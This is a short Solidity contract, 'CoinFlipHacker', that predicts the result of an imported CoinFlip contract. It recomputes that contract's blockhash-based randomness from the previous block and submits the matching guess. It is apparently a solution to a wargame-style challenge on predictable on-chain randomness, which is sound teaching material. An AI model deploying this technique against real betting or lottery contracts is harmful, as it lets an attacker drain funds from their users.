// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './coin_flip.sol';

contract CoinFlipHacker {

    using SafeMath for uint256;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coin_flip_address;

    constructor(address _coin_flip_addr) public {
        coin_flip_address = _coin_flip_addr;
    }

    function flip() public returns (bool) {

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return CoinFlip(coin_flip_address).flip(side);
    }
}
